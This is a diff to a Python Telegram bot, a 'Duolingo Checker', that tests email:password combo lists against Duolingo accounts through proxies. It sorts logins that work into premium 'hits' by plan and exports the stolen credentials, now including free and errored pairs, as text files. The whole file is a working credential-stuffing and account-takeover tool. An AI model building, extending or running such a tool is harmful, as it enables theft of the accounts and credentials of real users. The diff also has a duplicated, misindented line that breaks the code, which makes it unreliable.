@@ -45,9 +45,12 @@ hits_per_page = 10
 all_super_hits = []
 all_family_hits = []
 all_free_accounts = []
+all_error_accounts = []
 
 # Aggregate counters (across all users) - protected by stats_lock
 super_count = 0
+max_count = 0
+individual_count = 0
 family_count = 0
 free_count = 0
 fail_count = 0
@@ -565,14 +568,17 @@ def is_premium_account(data):
         if "trial" in pid.lower():
             continue
         if pid and pid != "N/A":
-            return True, "SUPER", None
+            plan = "MAX" if "max" in pid.lower() else "INDIVIDUAL"
+            return True, plan, None
     sub = data.get("subscription", {}) or {}
     if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
-        return True, "SUPER", None
+        pid = sub.get("productId", "")
+        plan = "MAX" if "max" in pid.lower() else "INDIVIDUAL"
+        return True, plan, None
     if data.get("has_item_premium_subscription"):
-        return True, "SUPER", None
+        return True, "INDIVIDUAL", None
     if data.get("hasPlus"):
-        return True, "SUPER", None
+        return True, "INDIVIDUAL", None
     return False, "FREE", None
 
 # ========== COMPACT HIT MESSAGE ==========
@@ -606,30 +612,32 @@ def format_hit(email, password, data, plan_type, sub, invite_token=None):
     courses_str = " ".join(course_flags) if course_flags else learn.split()[0] if learn else "?"
 
     if plan_type == "FAMILY":
-        header = "👨‍👩‍👧‍👦  𝗙𝗔𝗠𝗜𝗟𝗬  𝗣𝗟𝗔𝗡"
+        header = "👨‍👩‍👧‍👦  𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗙𝗔𝗠𝗜𝗟𝗬 𝗣𝗟𝗔𝗡"
+    elif plan_type == "MAX":
+        header = "🔷  𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗠𝗔𝗫 𝗣𝗟𝗔𝗡"
     else:
-        header = "💎  𝗦𝗨𝗣𝗘𝗥  𝗣𝗥𝗘𝗠𝗜𝗨𝗠"
+        header = "💎  𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗜𝗡𝗗𝗜𝗩𝗜𝗗𝗨𝗔𝗟 𝗣𝗟𝗔𝗡"
 
     # Proxy line (only if used)
     proxy_line = ""
     if sub.get("proxy"):
-        proxy_line = f"🌐 Proxy ➜ `{sub['proxy']}`\n"
+        proxy_line = f"\n🌐 Proxy : {sub['proxy']}"
 
-    # Tight, mobile-friendly layout (one-per-line)
     msg = (
         f"{header}\n"
-        f"`{email}:{password}`\n"
         f"\n"
-        f"👤 *{username}*\n"
-        f"⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
-        f"📚 {courses_str}  ←  {from_l}\n"
-        f"🔗 {social}\n"
-        f"💳 {sub['payment']}  ·  {sub['billing']}\n"
-        f"🔁 {sub['renew']}  ·  ⏰ {sub['expiry']}\n"
-        f"📦 `{sub['product']}`\n"
-        f"{proxy_line}"
+        f"Mail&Pass : `{email}:{password}`\n"
         f"\n"
-        f"🦉 _@justmicrothings Duolingo Checker V1.0"
+        f"Username : {username}\n"
+        f"Star : {xp:,}  |  Streak : {streak}d  |  Gems : {gems:,}\n"
+        f"Learning Language : {courses_str}  ←  {from_l}\n"
+        f"Social : {social}\n"
+        f"Payment Method & Billing : {sub['payment']}  ·  {sub['billing']}\n"
+        f"Renew : {sub['renew']}  |  Renew Date : {sub['expiry']}\n"
+        f"Sub Product : `{sub['product']}`"
+        f"{proxy_line}\n"
+        f"\n"
+        f"Duolingo Checker V1 by @justmicrothings"
     )
 
     return msg
@@ -853,8 +861,9 @@ def send_hits_list(chat_id, page=0):
         btns.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
     markup.row(*btns)
     markup.row(
-        InlineKeyboardButton("📋 EXPORT", callback_data="copy_all_hits"),
-        InlineKeyboardButton("🔄", callback_data="refresh_hits")
+        InlineKeyboardButton("📋 EXPORT HITS", callback_data="copy_all_hits"),
+        InlineKeyboardButton("⚠️ FREE", callback_data="export_free"),
+        InlineKeyboardButton("❌ ERRORS", callback_data="export_errors")
     )
     markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
     bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
@@ -996,7 +1005,7 @@ def send_proxy_list(chat_id, page=0, message_id=None):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     global MAX_THREADS, MAX_RETRIES
-    global super_count, family_count, free_count, fail_count
+    global super_count, family_count, free_count, fail_count, max_count, individual_count
     global all_super_hits, all_family_hits
 
     try:
@@ -1076,8 +1085,11 @@ def callback_handler(call):
             with hits_lock:
                 all_super_hits.clear()
                 all_family_hits.clear()
+                all_free_accounts.clear()
+                all_error_accounts.clear()
             with stats_lock:
                 super_count = family_count = free_count = fail_count = 0
+                max_count = individual_count = 0
             bot.send_message(call.message.chat.id, "✅ Cleared!")
             send_main_menu(call.message.chat.id, call.from_user.id)
 
@@ -1121,6 +1133,41 @@ def callback_handler(call):
                 file_obj = io.BytesIO(txt.encode('utf-8'))
                 file_obj.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                 bot.send_document(call.message.chat.id, file_obj, caption=f"📋 Total Hits: {total}")
+
+
+        elif call.data == "export_free":
+            bot.answer_callback_query(call.id)
+            with hits_lock:
+                free_snap = list(all_free_accounts)
+            if not free_snap:
+                bot.send_message(call.message.chat.id, "📭 No free accounts collected yet.")
+            else:
+                import io as _io
+                txt = f"FREE ACCOUNTS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n" + "="*30 + "\n\n"
+                for e, p in free_snap:
+                    txt += f"{e}:{p}\n"
+                file_obj = _io.BytesIO(txt.encode("utf-8"))
+                file_obj.name = f"free_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                bot.send_document(call.message.chat.id, file_obj,
+                                  caption=f"⚠️ Free Accounts: {len(free_snap)}")
+
+
+        elif call.data == "export_errors":
+            bot.answer_callback_query(call.id)
+            with hits_lock:
+                error_snap = list(all_error_accounts)
+            if not error_snap:
+                bot.send_message(call.message.chat.id, "📭 No error accounts collected yet.")
+            else:
+                import io as _io2
+                txt = f"ERROR ACCOUNTS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n" + "="*30 + "\n"
+                txt += f"Total: {len(error_snap)} accounts\n\n"
+                for e, p in error_snap:
+                    txt += f"{e}:{p}\n"
+                file_obj = _io2.BytesIO(txt.encode("utf-8"))
+                file_obj.name = f"errors_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                bot.send_document(call.message.chat.id, file_obj,
+                                  caption=f"❌ Error Accounts: {len(error_snap)}")
 
         elif call.data.startswith("hits_page_"):
             page = int(call.data.split("_")[2])
@@ -1351,7 +1398,7 @@ def callback_handler(call):
 # ========== PROCESS COMBOS (per-user, thread-safe) ==========
 def process_combos(chat_id, combos):
     """Each user's check runs in its own session. Hits/stats use locks."""
-    global super_count, family_count, free_count, fail_count
+    global super_count, family_count, free_count, fail_count, max_count, individual_count
     global last_batch_super, last_batch_family, last_batch_free, last_batch_fail
 
     sess = get_session(chat_id)
@@ -1361,7 +1408,10 @@ def process_combos(chat_id, combos):
 
     # Per-user local counters (so multiple users don't see each other's progress)
     local_super = local_family = local_free = local_fail = 0
+    local_max = local_individual = 0
     local_batch_super = local_batch_family = local_batch_free = local_batch_fail = 0
+                    local_batch_max = local_batch_individual = 0
+    local_batch_max = local_batch_individual = 0
 
     total = len(combos)
     completed = 0
@@ -1401,6 +1451,8 @@ def process_combos(chat_id, combos):
                     local_batch_fail += 1
                     with stats_lock:
                         fail_count += 1
+                    with hits_lock:
+                        all_error_accounts.append((email, password))
                     continue
 
                 if status == "HIT":
@@ -1411,10 +1463,23 @@ def process_combos(chat_id, combos):
                             family_count += 1
                         with hits_lock:
                             all_family_hits.append((email, password, detail))
-                    else:
+                    elif plan_type == "MAX":
+                        local_max += 1
+                        local_batch_max += 1
                         local_super += 1
                         local_batch_super += 1
                         with stats_lock:
+                            max_count += 1
+                            super_count += 1
+                        with hits_lock:
+                            all_super_hits.append((email, password, detail))
+                    else:  # INDIVIDUAL
+                        local_individual += 1
+                        local_batch_individual += 1
+                        local_super += 1
+                        local_batch_super += 1
+                        with stats_lock:
+                            individual_count += 1
                             super_count += 1
                         with hits_lock:
                             all_super_hits.append((email, password, detail))
@@ -1443,6 +1508,8 @@ def process_combos(chat_id, combos):
                     local_batch_free += 1
                     with stats_lock:
                         free_count += 1
+                    with hits_lock:
+                        all_free_accounts.append((email, password))
                 elif status == "STOPPED":
                     break
                 else:
@@ -1461,9 +1528,7 @@ def process_combos(chat_id, combos):
 [{bar}] {pct:.1f}%
 📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s
 
-💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
-+{local_batch_super}💎 +{local_batch_family}👨‍👩‍👧 +{local_batch_free}⚠️ +{local_batch_fail}❌
-
+Duolingo Max Plan : {local_max}\nDuolingo Family Plan : {local_family}\nDuolingo Individual Plan : {local_individual}\nDuolingo Free : {local_free}\nErrors : {local_fail}\n
 ⚡ /stop to cancel"""
                     try:
                         bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
@@ -1483,8 +1548,7 @@ def process_combos(chat_id, combos):
 ✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 (yours)
 {'━' * 32}
 ⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
-💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
-💾 VIEW HITS for results""", parse_mode='Markdown')
+Duolingo Max Plan : {local_max}\nDuolingo Family Plan : {local_family}\nDuolingo Individual Plan : {local_individual}\nDuolingo Free : {local_free}\nErrors : {local_fail}\n💾 VIEW HITS for results""", parse_mode='Markdown')
     send_main_menu(chat_id)
 
     with sess["lock"]:
